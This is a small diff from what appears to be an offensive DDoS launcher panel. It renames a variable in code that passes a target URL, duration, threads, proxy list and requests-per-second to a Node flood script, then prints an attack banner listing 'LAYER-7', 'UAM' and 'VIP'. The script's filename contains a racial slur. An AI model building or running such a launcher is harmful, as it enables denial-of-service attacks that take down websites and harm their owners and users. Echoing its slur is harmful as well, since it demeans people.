@@ -885,9 +885,9 @@ def main():
 				url = sin.split()[1]
 				time = sin.split()[2]
 				thread = sin.split()[3]
-                                proxy = sin.split()[4]
+                                p = sin.split()[4]
                                 rps = sin.split()[5]
-				os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rps}')
+				os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {p} {rps}')
 				os.system ("clear")
 				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
@@ -899,7 +899,7 @@ def main():
 \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
 \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
 \033[1;37m                   THREAD   : \033[35m[ \033[1;37m{thread} \033[35m]
-\033[1;37m                   PROXY    : \033[35m[ \033[1;37m{proxy} \033[35m]
+\033[1;37m                   PROXY    : \033[35m[ \033[1;37m{p} \033[35m]
 \033[1;37m                   RPS      : \033[35m[ \033[1;37m{rps} \033[35m]
 \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mUAM \033[35m]
 \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
